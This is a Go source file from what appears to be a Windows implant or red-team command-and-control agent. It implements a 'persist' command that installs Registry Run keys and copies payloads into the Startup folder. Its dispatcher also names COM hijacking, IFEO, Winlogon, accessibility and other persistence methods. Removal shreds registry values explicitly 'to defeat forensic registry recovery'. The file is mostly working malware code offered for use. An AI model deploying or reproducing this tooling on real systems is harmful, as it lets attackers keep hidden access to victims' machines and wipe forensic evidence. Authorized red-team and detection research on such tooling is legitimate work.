//go:build windows
// +build windows

// persist.go implements the persist command: dispatch, types, registry Run keys,
// and startup folder. Listing is in persist_list.go. COM hijack, screensaver,
// IFEO, and other methods are in persist_methods.go and persist_methods2.go.

package commands

import (
	"io"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

type PersistCommand struct{}

func (c *PersistCommand) Name() string {
	return "persist"
}

func (c *PersistCommand) Description() string {
	return "Install or remove persistence mechanisms"
}

type persistArgs struct {
	Method  string `json:"method"`
	Action  string `json:"action"`
	Name    string `json:"name"`
	Path    string `json:"path"`
	Hive    string `json:"hive"`
	CLSID   string `json:"clsid"`
	Timeout string `json:"timeout"`
}

func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[persistArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.Action == "" {
		args.Action = "install"
	}

	switch strings.ToLower(args.Method) {
	case "registry", "reg-run":
		return persistRegistryRun(args)
	case "startup-folder", "startup":
		return persistStartupFolder(args)
	case "com-hijack":
		return persistCOMHijack(args)
	case "screensaver":
		return persistScreensaver(args)
	case "ifeo":
		return persistIFEO(args)
	case "winlogon":
		return persistWinlogon(args)
	case "print-processor":
		return persistPrintProcessor(args)
	case "accessibility":
		return persistAccessibility(args)
	case "active-setup":
		return persistActiveSetup(args)
	case "time-provider":
		return persistTimeProvider(args)
	case "port-monitor":
		return persistPortMonitor(args)
	case "list":
		return listPersistence(args)
	default:
		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, accessibility, active-setup, time-provider, port-monitor, or list", args.Method)
	}
}

// persistRegistryRun adds/removes a registry Run key entry
func persistRegistryRun(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required for registry persistence")
	}

	// Determine hive — default to HKCU (doesn't need admin)
	hive := strings.ToUpper(args.Hive)
	if hive == "" {
		hive = "HKCU"
	}

	var hiveKey registry.Key
	var regPath string
	switch hive {
	case "HKCU":
		hiveKey = registry.CURRENT_USER
		regPath = `Software\Microsoft\Windows\CurrentVersion\Run`
	case "HKLM":
		hiveKey = registry.LOCAL_MACHINE
		regPath = `Software\Microsoft\Windows\CurrentVersion\Run`
	default:
		return errorf("Error: unsupported hive '%s'. Use HKCU or HKLM", hive)
	}

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			// Default to current executable
			exe, err := os.Executable()
			if err != nil {
				return errorf("Error getting executable path: %v", err)
			}
			args.Path = exe
		}

		key, _, err := registry.CreateKey(hiveKey, regPath, registry.SET_VALUE)
		if err != nil {
			return errorf("Error opening %s\\%s: %v", hive, regPath, err)
		}
		defer key.Close()

		if err := key.SetStringValue(args.Name, args.Path); err != nil {
			return errorf("Error writing registry value: %v", err)
		}

		return successf("Installed registry run key:\n  Key:   %s\\%s\n  Name:  %s\n  Value: %s", hive, regPath, args.Name, args.Path)

	case "remove":
		key, err := registry.OpenKey(hiveKey, regPath, registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			return errorf("Error opening %s\\%s: %v", hive, regPath, err)
		}
		defer key.Close()

		// Shred value before deletion to defeat forensic registry recovery
		shredRegistryValue(key, args.Name)

		return successf("Removed registry run key (shredded):\n  Key:  %s\\%s\n  Name: %s", hive, regPath, args.Name)

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}

// persistStartupFolder copies a file to the user's Startup folder
func persistStartupFolder(args persistArgs) structs.CommandResult {
	startupDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			exe, err := os.Executable()
			if err != nil {
				return errorf("Error getting executable path: %v", err)
			}
			args.Path = exe
		}

		if args.Name == "" {
			args.Name = filepath.Base(args.Path)
		}

		destPath := filepath.Join(startupDir, args.Name)

		// Copy the file to the startup folder
		src, err := os.Open(args.Path)
		if err != nil {
			return errorf("Error opening source '%s': %v", args.Path, err)
		}
		defer src.Close()

		dst, err := os.Create(destPath)
		if err != nil {
			return errorf("Error creating '%s': %v", destPath, err)
		}
		defer dst.Close() // Safety net for panics; explicit Close below catches flush errors
		bytes, err := io.Copy(dst, src)
		if err != nil {
			dst.Close()
			return errorf("Error copying file: %v", err)
		}

		if err := dst.Close(); err != nil {
			return errorf("Error finalizing destination file: %v", err)
		}

		return successf("Installed startup folder persistence:\n  Source: %s\n  Dest:   %s\n  Size:   %d bytes", args.Path, destPath, bytes)

	case "remove":
		if args.Name == "" {
			return errorResult("Error: name is required to remove startup folder entry")
		}

		destPath := filepath.Join(startupDir, args.Name)
		secureRemove(destPath)
		if _, err := os.Stat(destPath); err == nil {
			return errorf("Error removing '%s': file still exists", destPath)
		}

		return successf("Removed startup folder entry: %s", destPath)

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}

